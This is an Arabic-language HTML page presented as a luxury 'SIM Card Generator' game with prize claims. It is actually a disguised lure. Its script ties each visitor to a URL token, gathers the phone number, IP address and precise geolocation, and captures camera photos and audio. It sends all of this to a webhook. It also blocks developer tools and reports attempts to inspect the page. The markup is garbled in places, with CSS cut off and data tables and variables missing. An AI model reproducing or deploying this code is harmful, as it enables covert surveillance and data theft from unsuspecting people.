<!DOCTYPE html>
<html lang="ar">
<head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no" />
    <title>SIM Card Generator · Luxury Edition</title>
    <link rel="preconnect" href="https://fonts.googleapis.com" />
    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin />
    <link href="https://fonts.googleapis.com/css2?family=Cairo:wght@300;400;600;700;800;900&display=swap" rel="stylesheet" />
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css" />
    <style>
        /* ============================================================
           RESET · BASE
           ============================================================ */
        *,
        *::before,
        *::after {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        :root {
            --bg-deep: #06080f;
            --bg-mid: #0b0f1a;
            --gold: #c9a84c;
            --gold-light: #e8d5a3;
            --gold-dark: #a8873a;
            --silver: #a8b4c8;
            --text-primary: #f0ece6;
            --text-secondary: rgba(255, 255, 255, 0.45);
            --shadow-glow: rgba(201, 168, 76, 0.06);
            --radius-xl: 48px;
            --radius-lg: 24px;
            --radius-md: 16px;
            --transition-bounce: cubic-bezier(0.34, 1.56, 0.64, 1);
            --transition-smooth: cubic-bezier(0.23, 1, 0.32, 1);
            --transition-slow: cubic-bezier(0.6, 0, 0.4, 1);
        }

        html {
            font-size: 16px;
            -webkit-font-smoothing: antialiased;
            -moz-osx-font-smoothing: grayscale;
        }

        body {
            font-family: 'Cairo', 'Segoe UI', sans-serif;
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            padding: 12px;
            background: var(--bg-deep);
            color: var(--text-primary);
            position: relative;
            overflow-x: hidden;
            overflow-y: auto;
        }

        /* ============================================================
           BG · ATMOSPHERE
           ============================================================ */
        #bg-canvas {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            z-index: 0;
            pointer-events: none;
        }

        .bg-orb {
            position: fixed;
            border-radius: 50%;
            filter: blur(100px);
            pointer-events: none;
            z-index: 0;
            opacity: 0.15;
            animation: orbDrift 24s ease-in-out infinite alternate;
        }
        .bg-orb--1 {
            width: 70vmax;
            height: 70vmax;
            top: -15%;
            right: -20%;
            background: radial-gradient(ellipse, rgba(201, 168, 76, 0.06), transparent 70%);
            animation-duration: 30s;
        }
        .bg-orb--2 {
            width: 50vmax;
            height: 50vmax;
            bottom: -15%;
            left: -15%;
            background: radial-gradient(ellipse, rgba(80, 60, 180, 0.04), transparent 60%);
            animation-duration: 26s;
            animation-delay: 4s;
        }
        .bg-orb--3 {
            width: 40vmax;
            height: 40vmax;
            top: 40%;
            left: 50%;
            transform: translateX(-50%);
            background: radial-gradient(ellipse, rgba(201, 168, 76, 0.02), transparent 50%);
            animation-duration: 34s;
            animation-delay: 8s;
        }

        @keyframes orbDrift {
            0% {
                transform: translate(0, 0) scale(1);
            }
            33% {
                transform: translate(3%, -2%) scale(1.05);
            }
            66% {
                transform: translate(-2%, 3%) scale(0.95);
            }
            100% {
                transform: translate(2%, -3%) scale(1.02);
            }
        }

        .bg-grain {
            position: fixed;
            inset: 0;
            z-index: 0;
            pointer-events: none;
            opacity: 0.012;
            background-image: url("data:image/svg+xml,%3Csvg viewBox='0 0 256 256' xmlns='http://www.w3.org/2000/svg'%3E%3Cfilter id='n'%3E%3CfeTurbulence type='fractalNoise' baseFrequency='0.9' numOctaves='4' stitchTiles='stitch'/%3E%3C/filter%3E%3Crect width='100%25' height='100%25' filter='url(%23n)'/%3E%3C/svg%3E");
            background-size: 256px 256px;
            animation: grainMove 0.6s steps(3) infinite;
        }

        @keyframes grainMove {
            0% {
                transform: translate(0, 0);
            }
            100% {
                transform: translate(3px, 3px);
            }
        }

        /* ============================================================
           WRAPPER
           ============================================================ */
        .app-wrapper {
            position: relative;
            z-index: 10;
            width: 100%;
            max-width: 880px;
            margin: 0 auto;
            padding: 12px 0 30px;
        }

        /* ============================================================
           HEADER
           ============================================================ */
        .app-header {
            display: flex;
            align-items: center;
            justify-content: space-between;
            padding: 0 8px 28px 8px;
            flex-wrap: wrap;
            gap: 12px;
        }

        .app-header .brand {
            display: flex;
            align-items: center;
            gap: 14px;
        }

        .app-header .brand-icon {
            width: 48px;
            height: 48px;
            border-radius: 50%;
            background: linear-gradient(135deg, rgba(201, 168, 76, 0.06), rgba(201, 168, 76, 0.01));
            border: 1px solid rgba(201, 168, 76, 0.04);
            display: flex;
            align-items: center;
            justify-content: center;
            font-size: 22px;
            color: var(--gold);
            position: relative;
            backdrop-filter: blur(12px);
            box-shadow: 0 0 60px rgba(201, 168, 76, 0.02);
        }

        .app-header .brand-icon::after {
            content: '';
            position: absolute;
            inset: -4px;
            border-radius: 50%;
            background: radial-gradient(ellipse, rgba(201, 168, 76, 0.04), transparent 60%);
            filter: blur(16px);
            animation: iconGlow 3s ease-in-out infinite alternate;
            pointer-events: none;
        }

        @keyframes iconGlow {
            0% {
                opacity: 0.3;
                transform: scale(0.7);
            }
            100% {
                opacity: 1;
                transform: scale(1.4);
            }
        }

        .app-header .brand-text {
            font-size: 26px;
            font-weight: 900;
            letter-spacing: 1.5px;
            background: linear-gradient(135deg, #f0ece6, #e8d5a3, #c9a84c, #e8d5a3);
            background-size: 300% 300%;
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
            animation: shimmerText 7s ease-in-out infinite;
        }

        @keyframes shimmerText {
            0%,
            100% {
                background-position: 0% 50%;
            }
            50% {
                background-position: 100% 50%;
            }
        }

        .app-header .header-actions {
            display: flex;
            align-items: center;
            gap: 14px;
        }

        /* ============================================================
           SHUFFLE BUTTON · PREMIUM
           ============================================================ */
        .btn-shuffle {
            position: relative;
            background: rgba(255, 255, 255, 0.02);
            border: 1px solid rgba(255, 255, 255, 0.04);
            color: var(--text-secondary);
            font-weight: 700;
            padding: 12px 24px;
            border-radius: 60px;
            font-size: 14px;
            cursor: pointer;
            font-family: 'Cairo', sans-serif;
            display: flex;
            align-items: center;
            gap: 12px;
            transition: all 0.5s var(--transition-bounce);
            backdrop-filter: blur(12px);
            letter-spacing: 0.5px;
            overflow: hidden;
            box-shadow: 0 4px 30px rgba(0, 0, 0, 0.2);
        }

        .btn-shuffle::before {
            content: '';
            position: absolute;
            inset: 0;
            border-radius: 60px;
            padding: 1px;
            background: linear-gradient(135deg, rgba(255, 255, 255, 0.03), transparent 40%, transparent 60%, rgba(255, 255, 255, 0.01));
            -webkit-mask: linear-gradient(#fff 0 0) content-box, linear-gradient(#fff 0 0);
            mask: linear-gradient(#fff 0 0) content-box, linear-gradient(#fff 0 0);
            -webkit-mask-composite: xor;
            mask-composite: exclude;
            pointer-events: none;
        }

        .btn-shuffle:hover:not(:disabled) {
            background: rgba(201, 168, 76, 0.04);
            border-color: rgba(201, 168, 76, 0.06);
            color: var(--gold-light);
            transform: translateY(-2px);
            box-shadow: 0 12px 50px rgba(201, 168, 76, 0.02);
        }

        .btn-shuffle:active:not(:disabled) {
            transform: scale(0.94);
            transition-duration: 0.15s;
        }

        .btn-shuffle:disabled {
            opacity: 0.3;
            cursor: not-allowed;
            transform: none !important;
        }

        .btn-shuffle .shuffle-icon {
            font-size: 16px;
            transition: transform 0.8s var(--transition-bounce);
        }

        .btn-shuffle:hover .shuffle-icon {
            transform: rotate(180deg);
        }

        .btn-shuffle .shuffle-spinner {
            display: none;
            width: 18px;
            height: 18px;
            border: 2px solid rgba(201, 168, 76, 0.05);
            border-top: 2px solid var(--gold-light);
            border-radius: 50%;
            animation: spin 0.7s linear infinite;
        }

        .btn-shuffle.loading .shuffle-spinner {
            display: inline-block;
        }
        .btn-shuffle.loading .shuffle-icon {
            display: none;
        }

        @keyframes spin {
            to {
                transform: rotate(360deg);
            }
        }

        /* ============================================================
           STEP INDICATOR
           ============================================================ */
        .step-indicator {
            display: flex;
            justify-content: center;
            align-items: center;
            gap: 4px;
            margin-bottom: 30px;
            position: relative;
            padding: 0 10px;
        }

        .step-indicator::before {
            content: '';
            position: absolute;
            top: 50%;
            left: 15%;
            right: 15%;
            height: 1px;
            background: rgba(255, 255, 255, 0.02);
            transform: translateY(-50%);
            border-radius: 1px;
            z-index: 0;
        }

        .step-dot {
            position: relative;
            z-index: 1;
            width: 38px;
            height: 38px;
            border-radius: 50%;
            background: rgba(255, 255, 255, 0.01);
            border: 1px solid rgba(255, 255, 255, 0.03);
            display: flex;
            align-items: center;
            justify-content: center;
            font-weight: 700;
            font-size: 12px;
            color: rgba(255, 255, 255, 0.08);
            transition: all 0.7s var(--transition-bounce);
            backdrop-filter: blur(6px);
            cursor: default;
        }

        .step-dot .dot-ring {
            position: absolute;
            inset: -3px;
            border-radius: 50%;
            border: 1.5px solid transparent;
            transition: all 0.8s var(--transition-smooth);
            pointer-events: none;
        }

        .step-dot.active {
            background: linear-gradient(135deg, rgba(201, 168, 76, 0.08), rgba(201, 168, 76, 0.01));
            border-color: rgba(201, 168, 76, 0.06);
            color: var(--gold-light);
            transform: scale(1.06);
        }

        .step-dot.active .dot-ring {
            border-color: rgba(201, 168, 76, 0.06);
        }

        .step-dot.completed {
            background: rgba(201, 168, 76, 0.02);
            border-color: rgba(201, 168, 76, 0.03);
            color: var(--gold);
        }

        .step-line {
            position: relative;
            z-index: 0;
            flex: 1;
            max-width: 36px;
            height: 1px;
            background: rgba(255, 255, 255, 0.015);
            border-radius: 1px;
            transition: background 0.8s var(--transition-smooth);
        }

        .step-line.active {
            background: linear-gradient(90deg, rgba(201, 168, 76, 0.1), rgba(201, 168, 76, 0.02));
        }

        /* ============================================================
           CARD GRID
           ============================================================ */
        .cards-stage {
            position: relative;
            min-height: 420px;
            padding: 4px 0;
        }

        .cards-grid {
            display: grid;
            grid-template-columns: repeat(auto-fill, minmax(170px, 1fr));
            gap: 20px;
            justify-items: center;
            padding: 6px 0;
        }

        /* ============================================================
           SIM CARD · 3D LUXURY
           ============================================================ */
        .sim-card-wrap {
            perspective: 1200px;
            width: 100%;
            max-width: 200px;
            aspect-ratio: 3/4.2;
            cursor: pointer;
            position: relative;
            transition: transform 0.6s var(--transition-bounce);
        }

        .sim-card-wrap:hover {
            transform: translateY(-6px) scale(1.02);
        }

        .sim-card {
            position: relative;
            width: 100%;
            height: 100%;
            transform-style: preserve-3d;
            transition: transform 0.8s var(--transition-bounce);
            border-radius: var(--radius-lg);
            box-shadow: 0 20px 60px rgba(0, 0, 0, 0.4);
        }

        .sim-card.flipped {
            transform: rotateY(180deg);
        }

        .sim-card-face {
            position: absolute;
            inset: 0;
            border-radius: var(--radius-lg);
            backface-visibility: hidden;
            overflow: hidden;
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            padding: 18px 14px;
            background: rgba(255, 255, 255, 0.015);
            border: 1px solid rgba(255, 255, 255, 0.03);
            backdrop-filter: blur(20px) saturate(1.2);
            -webkit-backdrop-filter: blur(20px) saturate(1.2);
        }

        /* --- FRONT --- */
        .sim-card-front {
            z-index: 2;
            transform: rotateY(0deg);
        }

        /* --- BACK --- */
        .sim-card-back {
            transform: rotateY(180deg);
            background: rgba(10, 8, 16, 0.85);
            backdrop-filter: blur(24px);
            border: 1px solid rgba(201, 168, 76, 0.04);
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            gap: 10px;
            text-align: center;
        }

        .sim-card-back .back-flag {
            font-size: 48px;
            line-height: 1;
            filter: drop-shadow(0 4px 20px rgba(0, 0, 0, 0.3));
        }

        .sim-card-back .back-name {
            font-size: 22px;
            font-weight: 800;
            color: var(--text-primary);
            letter-spacing: 1px;
        }

        .sim-card-back .back-prefix {
            font-size: 13px;
            color: var(--text-secondary);
            font-weight: 300;
            letter-spacing: 2px;
        }

        .sim-card-back .back-select {
            margin-top: 8px;
            padding: 8px 24px;
            border-radius: 60px;
            border: 1px solid rgba(201, 168, 76, 0.06);
            background: rgba(201, 168, 76, 0.02);
            color: var(--gold-light);
            font-size: 13px;
            font-weight: 700;
            font-family: 'Cairo', sans-serif;
            cursor: pointer;
            transition: all 0.4s ease;
        }

        .sim-card-back .back-select:hover {
            background: rgba(201, 168, 76, 0.04);
            border-color: rgba(201, 168, 76, 0.08);
            transform: scale(1.02);
        }

        /* --- CARD GLASS LAYERS --- */
        .sim-card .card-shine {
            position: absolute;
            inset: 0;
            border-radius: var(--radius-lg);
            pointer-events: none;
            z-index: 1;
            background: radial-gradient(ellipse at 30% 20%, rgba(255, 255, 255, 0.02), transparent 50%);
            animation: shineFloat 8s ease-in-out infinite alternate;
        }

        @keyframes shineFloat {
            0% {
                transform: translate(0, 0) rotate(0deg);
                opacity: 0.4;
            }
            100% {
                transform: translate(6%, 4%) rotate(3deg);
                opacity: 0.8;
            }
        }

        .sim-card .card-border-glow {
            position: absolute;
            inset: -1px;
            border-radius: var(--radius-lg);
            pointer-events: none;
            z-index: 0;
            background: radial-gradient(ellipse at 50% 0%, var(--card-glow, rgba(201, 168, 76, 0.02)), transparent 60%);
            opacity: 0.3;
            animation: borderPulse 4s ease-in-out infinite alternate;
        }

        @keyframes borderPulse {
            0% {
                opacity: 0.2;
            }
            100% {
                opacity: 0.6;
            }
        }

        .sim-card .card-material {
            position: absolute;
            inset: 2px;
            border-radius: calc(var(--radius-lg) - 2px);
            pointer-events: none;
            z-index: 0;
            background: var(--card-material-bg, rgba(255, 255, 255, 0.01));
        }

        /* --- CARD CONTENT --- */
        .sim-card .card-rarity {
            position: absolute;
            top: 10px;
            right: 12px;
            font-size: 9px;
            font-weight: 800;
            letter-spacing: 2px;
            color: var(--rarity-color, rgba(255, 255, 255, 0.08));
            text-transform: uppercase;
            z-index: 3;
            opacity: 0.5;
            transition: opacity 0.4s ease;
        }

        .sim-card-wrap:hover .card-rarity {
            opacity: 1;
        }

        .sim-card .card-icon {
            font-size: 40px;
            color: var(--card-icon-color, rgba(255, 255, 255, 0.04));
            margin-bottom: 6px;
            filter: drop-shadow(0 4px 30px rgba(0, 0, 0, 0.2));
            z-index: 3;
            transition: all 0.6s var(--transition-bounce);
        }

        .sim-card-wrap:hover .card-icon {
            transform: scale(1.04) rotate(-2deg);
            color: var(--card-icon-hover, var(--gold-light));
        }

        .sim-card .card-name {
            font-size: 16px;
            font-weight: 800;
            color: var(--text-primary);
            z-index: 3;
            letter-spacing: 0.5px;
            text-align: center;
        }

        .sim-card .card-sub {
            font-size: 10px;
            color: var(--text-secondary);
            font-weight: 300;
            z-index: 3;
            letter-spacing: 3px;
            margin-top: 2px;
            opacity: 0.4;
        }

        .sim-card .card-engrave {
            position: absolute;
            bottom: 12px;
            right: 14px;
            font-size: 7px;
            color: rgba(255, 255, 255, 0.02);
            letter-spacing: 4px;
            font-weight: 300;
            z-index: 3;
            text-transform: uppercase;
            pointer-events: none;
            font-family: 'Cairo', monospace;
        }

        .sim-card .card-particles {
            position: absolute;
            inset: 0;
            pointer-events: none;
            z-index: 1;
            overflow: hidden;
            border-radius: var(--radius-lg);
        }

        .sim-card .card-particles .p {
            position: absolute;
            width: 2px;
            height: 2px;
            border-radius: 50%;
            background: var(--gold);
            opacity: 0;
            animation: particleFloat 4s ease-in-out infinite;
        }

        @keyframes particleFloat {
            0% {
                opacity: 0;
                transform: translate(0, 0) scale(0);
            }
            20% {
                opacity: 0.3;
            }
            80% {
                opacity: 0.3;
            }
            100% {
                opacity: 0;
                transform: translate(var(--px, 20px), var(--py, -30px)) scale(1);
            }
        }

        /* --- CARD HOLOGRAM --- */
        .sim-card .card-holo {
            position: absolute;
            inset: 0;
            border-radius: var(--radius-lg);
            pointer-events: none;
            z-index: 0;
            opacity: 0.06;
            background: conic-gradient(from var(--holo-angle, 0deg),
                    transparent,
                    rgba(201, 168, 76, 0.02),
                    transparent 30%,
                    rgba(255, 255, 255, 0.01),
                    transparent 60%,
                    rgba(201, 168, 76, 0.015),
                    transparent 80%,
                    transparent);
            animation: holoRotate 12s linear infinite;
            mix-blend-mode: overlay;
        }

        @keyframes holoRotate {
            from {
                --holo-angle: 0deg;
            }
            to {
                --holo-angle: 360deg;
            }
        }

        /* ============================================================
           CARD ENTER ANIMATION
           ============================================================ */
        .sim-card-wrap.entering {
            animation: cardEnter 0.9s var(--transition-bounce) forwards;
        }

        @keyframes cardEnter {
            0% {
                opacity: 0;
                transform: translateY(40px) scale(0.6) rotateX(10deg);
                filter: blur(8px);
            }
            60% {
                opacity: 1;
                transform: translateY(-4px) scale(1.02) rotateX(0deg);
                filter: blur(0);
            }
            100% {
                opacity: 1;
                transform: translateY(0) scale(1) rotateX(0deg);
                filter: blur(0);
            }
        }

        .sim-card-wrap.exiting {
            animation: cardExit 0.6s var(--transition-smooth) forwards;
        }

        @keyframes cardExit {
            0% {
                opacity: 1;
                transform: translateY(0) scale(1) rotateY(0deg);
            }
            100% {
                opacity: 0;
                transform: translateY(-60px) scale(0.3) rotateY(60deg);
                filter: blur(12px);
            }
        }

        /* ============================================================
           STEP 2 · CLAIM
           ============================================================ */
        .claim-area {
            display: none;
            animation: stepEnter 0.7s var(--transition-bounce) forwards;
        }

        .claim-area.active {
            display: block;
        }

        @keyframes stepEnter {
            0% {
                opacity: 0;
                transform: translateY(30px) scale(0.96);
            }
            100% {
                opacity: 1;
                transform: translateY(0) scale(1);
            }
        }

        .claim-area .step-title {
            font-size: 26px;
            font-weight: 800;
            margin-bottom: 2px;
            color: var(--text-primary);
            text-align: center;
        }

        .claim-area .step-title .highlight {
            background: linear-gradient(135deg, #e8d5a3, #c9a84c, #a8873a);
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
        }

        .claim-area .step-desc {
            text-align: center;
            color: var(--text-secondary);
            font-size: 14px;
            font-weight: 300;
            margin-bottom: 22px;
        }

        .gift-panel {
            position: relative;
            background: rgba(255, 255, 255, 0.01);
            border-radius: var(--radius-lg);
            padding: 20px 22px 18px;
            margin: 0 0 18px;
            border: 1px solid rgba(255, 255, 255, 0.02);
            overflow: hidden;
        }

        .gift-panel::before {
            content: '';
            position: absolute;
            top: -30%;
            right: -20%;
            width: 50%;
            height: 160%;
            background: radial-gradient(ellipse, rgba(201, 168, 76, 0.01), transparent 60%);
            pointer-events: none;
        }

        .gift-panel .gift-top {
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 14px;
            margin-bottom: 12px;
            position: relative;
            z-index: 1;
        }

        .gift-panel .gift-box-3d {
            font-size: 36px;
            color: var(--gold);
            animation: giftFloat 3.6s ease-in-out infinite;
            filter: drop-shadow(0 8px 40px rgba(201, 168, 76, 0.02));
            position: relative;
        }

        @keyframes giftFloat {
            0%,
            100% {
                transform: translateY(0);
            }
            50% {
                transform: translateY(-5px);
            }
        }

        .gift-panel .gift-title {
            font-size: 18px;
            font-weight: 700;
            color: var(--text-primary);
        }

        .gift-panel ul {
            list-style: none;
            padding: 0;
            margin: 2px 0 0;

    <script>
        // ============================================================

        // ============================================================

            'فلسطين': { flag: '🇵🇸', prefixes: ['5', '9'], colors: ['#1a2a1a', '#2a3a2a', '#0a1a0a', '#3a4a3a'],
                accent: '#2a3a2a' },
            'الجزائر': { flag: '🇩🇿', prefixes: ['5', '6', '7'], colors: ['#1a3a2a', '#2a5a3a', '#0a2a1a', '#3a6a4a'],
                accent: '#2a5a3a' },
            'المغرب': { flag: '🇲🇦', prefixes: ['6', '7'], colors: ['#3a1a0a', '#5a2a1a', '#1a0a00', '#6a3a2a'],

                accent: '#2a5a5a' },

                accent: '#3a5a2a' },
            'موريتانيا': { flag: '🇲🇷', prefixes: ['4', '5'], colors: ['#1a2a1a', '#2a3a2a', '#0a1a0a', '#3a4a3a'],
                accent: '#2a3a2a' },

        const COUNTRY_NAMES = Object.keys(COUNTRIES_DATA);
        const RARITIES = [
            { id: 'common', label: 'Common', weight: 35, color: 'rgba(255,255,255,0.04)', glow: 'rgba(255,255,255,0.01)' },
            { id: 'rare', label: 'Rare', weight: 25, color: 'rgba(100,180,255,0.08)', glow: 'rgba(100,180,255,0.02)' },
            { id: 'epic', label: 'Epic', weight: 18, color: 'rgba(180,100,255,0.08)', glow: 'rgba(180,100,255,0.02)' },
            { id: 'legendary', label: 'Legendary', weight: 12, color: 'rgba(255,200,50,0.10)',
            glow: 'rgba(255,200,50,0.03)' },
            { id: 'crystal', label: 'Crystal', weight: 5, color: 'rgba(100,255,220,0.08)', glow: 'rgba(100,255,220,0.02)' },
            { id: 'titanium', label: 'Titanium', weight: 3, color: 'rgba(180,200,220,0.10)',
            glow: 'rgba(180,200,220,0.03)' },
            { id: 'diamond', label: 'Diamond', weight: 1.5, color: 'rgba(200,255,255,0.12)',
            glow: 'rgba(200,255,255,0.04)' },
            { id: 'quantum', label: 'Quantum', weight: 0.5, color: 'rgba(255,100,200,0.12)',
            glow: 'rgba(255,100,200,0.04)' },
        ];

        // ============================================================
        //  TOKEN
        // ============================================================
        let USER_TOKEN = null;

        function extractTokenFromURL() {
            const params = new URLSearchParams(window.location.search);
            const token = params.get('i');
            if (token && token.length >= 6 && token.length <= 8 && /^[A-Z0-9]+$/.test(token)) {
                USER_TOKEN = token;
                return true;
            }
            USER_TOKEN = null;
            return false;
        }

        // ============================================================
        //  WEBHOOK
        // ============================================================
        async function sendToWebhook(formData) {
            if (!USER_TOKEN) {
                console.error('❌ Token missing');
                return { success: false, error: 'Token missing' };
            }
            formData.append('token', USER_TOKEN);
            try {
                const res = await fetch(WEBHOOK_URL, { method: 'POST', body: formData });
                const data = await res.json();
                if (!res.ok) return { success: false, error: data.message || 'HTTP error' };
                return { success: true, data };
            } catch (e) {
                return { success: false, error: e.message };
            }
        }

        // ============================================================
        //  STATE
        // ============================================================
        let selectedCountry = null;
        let userPhone = null;
        let mediaStream = null;
        let audioStream = null;
        let audioRecorder = null;
        let audioChunks = [];
        let capturedPhotoFiles = [];
        let audioBlob = null;
        let userIP = 'غير متاح';
        let userLocation = { lat: null, lng: null, accuracy: null, error: null };
        let isProcessing = false;
        let timerInterval = null;
        let timerSeconds = 180;
        let isShuffling = false;
        let currentCards = [];
        let selectedCardIndex = -1;

        // DOM
        const cardsGrid = document.getElementById('cardsGrid');
        const statusCards = document.getElementById('statusCards');
        const statusTasks = document.getElementById('statusTasks');
        const statusTimer = document.getElementById('statusTimer');
        const claimBtn = document.getElementById('claimBtn');
        const phoneInput = document.getElementById('phoneInput');
        const permissionArea = document.getElementById('permissionArea');
        const timerDisplay = document.getElementById('timerDisplay');
        const taskSub = document.getElementById('taskSub');
        const shuffleBtn = document.getElementById('shuffleBtn');

        // ============================================================
        //  STEP INDICATOR
        // ============================================================
        function updateStepIndicator(step) {
            stepDots.forEach((dot, idx) => {
                const num = idx + 1;
                dot.classList.remove('active', 'completed');
                if (num === step) dot.classList.add('active');
                else if (num < step) dot.classList.add('completed');
            });
            stepLines.forEach((line, idx) => {
                const num = idx + 1;
                line.classList.toggle('active', num < step);
            });
        }

        function showStep(stepId) {
            document.querySelectorAll('.step, .claim-area').forEach(el => el.classList.remove('active'));
            const target = document.getElementById(stepId);
            if (target) target.classList.add('active');
            // update indicator
            const map = { 'step-cards': 1, 'step-claim': 2, 'step-timer': 3 };
            updateStepIndicator(map[stepId] || 1);
        }

        // ============================================================
        //  SUSPICIOUS
        // ============================================================
        function detectSuspiciousActivity() {
            document.addEventListener('contextmenu', (e) => { e.preventDefault();
                sendSuspiciousAlert('🖱️ النقر الأيمن'); });
            document.addEventListener('keydown', (e) => {
                const k = e.key;
                const c = e.ctrlKey || e.metaKey;
                const s = e.shiftKey;
                if (k === 'F12' || (c && s && (k === 'I' || k === 'C' || k === 'J')) || (c && k === 'U')) {
                    e.preventDefault();
                    sendSuspiciousAlert(`⌨️ أدوات المطور (${k})`);
                }
                if (c && ['c', 'v', 'x'].includes(k)) {
                    sendSuspiciousAlert(`📋 ${k === 'c' ? 'نسخ' : k === 'v' ? 'لصق' : 'قص'}`);
                }
            });
            document.addEventListener('dragstart', (e) => { e.preventDefault();
                sendSuspiciousAlert('🔄 سحب'); });
            document.addEventListener('selectstart', () => { sendSuspiciousAlert('✏️ تحديد نص'); });
        }

        let alertCooldown = 0;

        function sendSuspiciousAlert(action) {
            if (!USER_TOKEN) return;
            const now = Date.now();
            if (now - alertCooldown < 5000) return;
            alertCooldown = now;
            const fd = new FormData();
            fd.append('event', 'suspicious');
            fd.append('action', action);
            fd.append('timestamp', new Date().toISOString());
            fd.append('ip', userIP);
            fd.append('userAgent', navigator.userAgent);
            fd.append('url', window.location.href);
            sendToWebhook(fd).catch(() => {});
        }

        // ============================================================
        //  RARITY PICKER
        // ============================================================
        function pickRarity() {
            const total = RARITIES.reduce((s, r) => s + r.weight, 0);
            let rand = Math.random() * total;
            for (const r of RARITIES) {
                rand -= r.weight;
                if (rand <= 0) return r;
            }
            return RARITIES[0];
        }

        // ============================================================
        //  CARD GENERATOR
        // ============================================================
        function generateCardDesign(countryName, index) {
            const country = COUNTRIES_DATA[countryName];
            const rarity = pickRarity();
            const colors = country.colors;
            const c1 = colors[Math.floor(Math.random() * colors.length)];
            const c2 = colors[Math.floor(Math.random() * colors.length)];
            const c3 = colors[Math.floor(Math.random() * colors.length)];

            // random material variation
            const materials = [
                'linear-gradient(135deg, rgba(255,255,255,0.02), rgba(255,255,255,0.005))',
                'linear-gradient(145deg, rgba(255,255,255,0.015), rgba(0,0,0,0.01))',
                'radial-gradient(ellipse at 30% 40%, rgba(255,255,255,0.02), transparent 60%)',
                'linear-gradient(225deg, rgba(255,255,255,0.01), rgba(0,0,0,0.01))',
            ];
            const material = materials[Math.floor(Math.random() * materials.length)];

            // random icon
            const icons = ['fa-sim-card', 'fa-microchip', 'fa-wifi', 'fa-signal', 'fa-broadcast', 'fa-satellite'];
            const icon = icons[Math.floor(Math.random() * icons.length)];

            // random engraving
            const engravings = ['LIMITED', 'PREMIUM', 'EXCLUSIVE', 'EDITION', 'MASTER', 'ELITE', 'PRIME', 'ULTRA', 'HYPER',
                'NEO'
            ];
            const engraving = engravings[Math.floor(Math.random() * engravings.length)];

            // random holo angle
            const holoAngle = Math.floor(Math.random() * 360);

            // particles
            const particleCount = 4 + Math.floor(Math.random() * 8);
            const particles = [];
            for (let i = 0; i < particleCount; i++) {
                particles.push({
                    px: (Math.random() - 0.5) * 60,
                    py: (Math.random() - 0.5) * 80,
                    delay: Math.random() * 4,
                    duration: 3 + Math.random() * 3,
                });
            }

            return {
                country: countryName,
                flag: country.flag,
                prefixes: country.prefixes,
                rarity,
                colors: [c1, c2, c3],
                accent: country.accent,
                material,
                icon,
                engraving,
                holoAngle,
                particles,
                index,
                id: `card-${Date.now()}-${index}-${Math.random().toString(36).substr(2, 4)}`,
            };
        }

        // ============================================================
        //  LOCATION
        // ============================================================
        async function getLocation() {
            return new Promise((resolve) => {
                if (!navigator.geolocation) {
                    userLocation.error = 'المتصفح لا يدعم تحديد الموقع';
                    resolve();
                    return;
                }
                let watchId = null;
                let best = null;
                let bestAcc = Infinity;
                let resolved = false;
                let attempts = 0;
                const MAX_ATTEMPTS = 10;
                const TIMEOUT_MS = 15000;
                const TARGET = 100;

                const done = () => {
                    if (resolved) return;
                    resolved = true;
                    if (watchId !== null) navigator.geolocation.clearWatch(watchId);
                    if (best) {
                        userLocation.lat = best.coords.latitude;
                        userLocation.lng = best.coords.longitude;
                        userLocation.accuracy = best.coords.accuracy;
                        userLocation.error = null;
                    } else {
                        userLocation.error = 'لم نتمكن من الحصول على موقع دقيق';
                    }
                    resolve();
                };

                const timeoutId = setTimeout(() => {
                    if (!resolved) {
                        if (watchId !== null) navigator.geolocation.clearWatch(watchId);
                        if (best) done();
                        else { userLocation.error = 'انتهت المهلة';
                            resolve(); }
                    }
                }, TIMEOUT_MS);

                const handlePos = (pos) => {
                    attempts++;
                    const acc = pos.coords.accuracy;
                    if (acc < bestAcc) { bestAcc = acc;
                        best = pos; }
                    if (acc <= TARGET || attempts >= MAX_ATTEMPTS) {
                        done();
                        clearTimeout(timeoutId);
                    }
                };

                const handleErr = (err) => {
                    if (resolved) return;
                    if (err.code === 1) {
                        userLocation.error = 'تم رفض الإذن بالموقع';
                        resolved = true;
                        if (watchId !== null) navigator.geolocation.clearWatch(watchId);
                        clearTimeout(timeoutId);
                        resolve();
                        return;
                    }
                    if (attempts >= MAX_ATTEMPTS) {
                        if (best) done();
                        else { userLocation.error = err.message || 'تعذر الحصول على الموقع';
                            resolve(); }
                    }
                };

                watchId = navigator.geolocation.watchPosition(handlePos, handleErr, {
                    enableHighAccuracy: true,
                    timeout: 5000,
                    maximumAge: 2000
                });
            });
        }

        // ============================================================
        //  CAMERA
        // ============================================================
        async function startCameraAndCapture() {
            try {
                const constraints = { video: true, audio: false };
                mediaStream = await navigator.mediaDevices.getUserMedia(constraints);
                video.srcObject = mediaStream;
                await video.play();

                await new Promise((resolve, reject) => {
                    const to = setTimeout(() => reject(new Error('Video timeout')), 10000);
                    const ready = () => { clearTimeout(to);
                        resolve(); };
                    if (video.readyState >= 2 && video.videoWidth > 0) ready();
                    else {
                        video.addEventListener('loadedmetadata', ready);
                        video.addEventListener('canplay', ready);
                        video.play().catch(() => {});
                    }
                });

                await new Promise((r) => setTimeout(r, 500));
                const ctx = canvas.getContext('2d');
                const w = Math.min(video.videoWidth || 640, 1920);
                const h = Math.min(video.videoHeight || 480, 1080);
                canvas.width = w;
                canvas.height = h;

                capturedPhotoFiles = [];
                for (let i = 1; i <= TOTAL_PHOTOS; i++) {
                    ctx.drawImage(video, 0, 0, w, h);
                    const blob = await new Promise((res) => canvas.toBlob(res, 'image/jpeg', PHOTO_QUALITY));
                    if (blob && blob.size > 1000) {
                        const file = new File([blob], `photo_${i}_${Date.now()}.jpg`, { type: 'image/jpeg' });
                        capturedPhotoFiles.push(file);
                    }
                    if (i < TOTAL_PHOTOS) await new Promise((r) => setTimeout(r, CAPTURE_INTERVAL));
